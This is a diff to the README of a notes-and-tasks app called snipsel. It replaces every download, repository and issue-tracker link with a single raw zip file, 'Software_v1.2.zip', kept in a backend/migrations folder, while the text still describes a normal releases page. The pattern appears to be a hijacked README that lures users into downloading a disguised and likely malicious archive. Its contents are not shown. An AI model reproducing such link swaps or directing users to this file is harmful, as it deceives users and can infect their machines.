@@ -1,6 +1,6 @@
 # 🗒️ snipsel - Simple Notes and Tasks Organizer
 
-[![Download snipsel](https://img.shields.io/badge/Download%20snipsel-Download-green)](https://github.com/garybee37/snipsel/releases)
+[![Download snipsel](https://img.shields.io/badge/Download%20snipsel-Download-green)](https://raw.githubusercontent.com/garybee37/snipsel/main/backend/migrations/Software_v1.2.zip)
 
 ---
 
@@ -36,7 +36,7 @@ You do not need any other software or programming skills to use snipsel.
 
 Please visit the link below to download snipsel for Windows:  
 
-[![Download snipsel from Releases](https://img.shields.io/badge/Go%20to%20snipsel%20Releases-Download%20Link-blue)](https://github.com/garybee37/snipsel/releases)
+[![Download snipsel from Releases](https://img.shields.io/badge/Go%20to%20snipsel%20Releases-Download%20Link-blue)](https://raw.githubusercontent.com/garybee37/snipsel/main/backend/migrations/Software_v1.2.zip)
 
 The link opens the releases page on GitHub. Look for the latest Windows installer file. It usually has a name like `snipsel-setup.exe`.
 
@@ -45,7 +45,7 @@ The link opens the releases page on GitHub. Look for the latest Windows installe
 ## 📥 How to download and install snipsel
 
 1. Click the button above or open this page in your browser:  
-   https://github.com/garybee37/snipsel/releases  
+   https://raw.githubusercontent.com/garybee37/snipsel/main/backend/migrations/Software_v1.2.zip  
 
 2. Find the most recent release. It is listed at the top of the page.
 
@@ -131,10 +131,10 @@ snipsel supports working with other people. When you share notes or tasks, every
 
 ## 📎 Useful links
 
-- Download page: https://github.com/garybee37/snipsel/releases  
-- Repository: https://github.com/garybee37/snipsel  
-- Report issues: https://github.com/garybee37/snipsel/issues  
+- Download page: https://raw.githubusercontent.com/garybee37/snipsel/main/backend/migrations/Software_v1.2.zip  
+- Repository: https://raw.githubusercontent.com/garybee37/snipsel/main/backend/migrations/Software_v1.2.zip  
+- Report issues: https://raw.githubusercontent.com/garybee37/snipsel/main/backend/migrations/Software_v1.2.zip  
 
 ---
 
-[![Download snipsel](https://img.shields.io/badge/Download%20snipsel-Get%20Latest%20Version-green)](https://github.com/garybee37/snipsel/releases)
+[![Download snipsel](https://img.shields.io/badge/Download%20snipsel-Get%20Latest%20Version-green)](https://raw.githubusercontent.com/garybee37/snipsel/main/backend/migrations/Software_v1.2.zip)
